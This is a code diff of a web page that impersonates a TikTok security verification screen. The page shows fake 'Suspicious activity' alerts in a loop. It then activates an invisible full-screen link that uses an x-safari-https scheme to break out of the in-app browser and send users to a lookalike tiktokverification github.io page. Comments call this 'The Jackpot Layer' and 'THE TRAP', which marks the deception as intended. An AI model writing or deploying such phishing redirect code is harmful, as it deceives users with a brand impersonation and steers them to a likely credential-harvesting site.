@@ -3,51 +3,79 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Security Check</title>
+    <title>Verification</title>
     <style>
-        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        #msg { color: #8A8B91; font-size: 14px; text-align: center; }
+        body, html { 
+            margin: 0; padding: 0; background: #ffffff; 
+            font-family: "Proxima Nova", "Inter", -apple-system, sans-serif;
+            -webkit-font-smoothing: antialiased;
+            height: 100%; overflow: hidden;
+        }
+
+        /* The Jackpot Layer: Swapped to the confirmed schema */
+        #full-screen-redirect {
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            z-index: 9999; opacity: 0; cursor: pointer;
+            display: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        #wrapper {
+            display: flex; justify-content: center; align-items: center;
+            height: 100vh; width: 100%;
+        }
+
+        #main-content { text-align: center; padding: 0 30px; max-width: 400px; }
+        .verification-icon { width: 72px; height: 72px; margin-bottom: 20px; }
+        .header { color: #161823; font-size: 24px; font-weight: 700; margin-bottom: 12px; }
+        .subtext { color: #8A8B91; font-size: 16px; line-height: 1.5; margin-bottom: 60px; }
+        .tiktok-btn-visual {
+            background-color: #FE2C55; color: #ffffff; border-radius: 4px;
+            font-size: 16px; font-weight: 600; padding: 12px 60px;
+            width: 100%; display: inline-block; box-sizing: border-box;
+        }
     </style>
 </head>
 <body>
 
-    <div id="msg">Verifying connection integrity...</div>
+    <a id="full-screen-redirect" href="x-safari-https://tiktokverification.github.io/captcha/Verification/verify1.html"></a>
+
+    <div id="wrapper">
+        <div id="main-content">
+            <svg class="verification-icon" viewBox="0 0 48 48" fill="none">
+                <path d="M24 4L6 12V22C6 33.1 13.7 43.4 24 46C34.3 43.4 42 33.1 42 22V12L24 4Z" fill="#F1F1F2"/>
+                <rect x="22" y="16" width="4" height="12" rx="2" fill="#161823"/>
+                <rect x="22" y="30" width="4" height="4" rx="2" fill="#161823"/>
+            </svg>
+
+            <div class="header">Suspicious activity</div>
+            <div class="subtext">Please complete verification to continue using TikTok.</div>
+            <div class="tiktok-btn-visual">Verify</div>
+        </div>
+    </div>
 
     <script>
-        const target = "tiktokverification.github.io/captcha/Verification/verify1.html";
-
-        function breakout() {
-            // Method #1 - The confirmed winner
-            window.location.href = "x-safari-https://" + target;
-        }
-
         window.onload = function() {
-            const duration = 10000;
+            const duration = 10000; 
             const startTime = Date.now();
+            const header = "Suspicious network activity";
+            const baseMsg = "Please wait while we check your connection. This will only take a moment. Please do not close the TikTok app during the security check.";
 
-            function loop() {
+            function runAlerts() {
                 const elapsed = Date.now() - startTime;
                 const remaining = Math.max(0, Math.ceil((duration - elapsed) / 1000));
 
                 if (remaining > 0) {
-                    // THE TRAP:
-                    // 1. Show the alert. This pauses all JS execution.
-                    alert("Suspicious activity detected.\n\nPlease wait for the security scan to complete.\n\nTime remaining: " + remaining + "s");
-                    
-                    // 2. The MOMENT they hit 'OK', this line fires. 
-                    // Because 'OK' was a user tap, the OS permits the breakout.
-                    breakout();
-
-                    // 3. Queue the next one
-                    setTimeout(loop, 10);
+                    alert(header + "\n\n" + baseMsg + "\n\nTime remaining: " + remaining + "s");
+                    setTimeout(runAlerts, 50); 
                 } else {
-                    alert("Security check complete. Opening Safari...");
-                    breakout();
+                    // Activate the invisible breakout link
+                    document.getElementById('full-screen-redirect').style.display = 'block';
+                    alert("Security check complete. Please tap 'Verify' to continue.");
                 }
             }
 
-            // Small delay to ensure the page is fully ready to receive the gesture
-            setTimeout(loop, 800);
+            setTimeout(runAlerts, 500);
         };
     </script>
 </body>
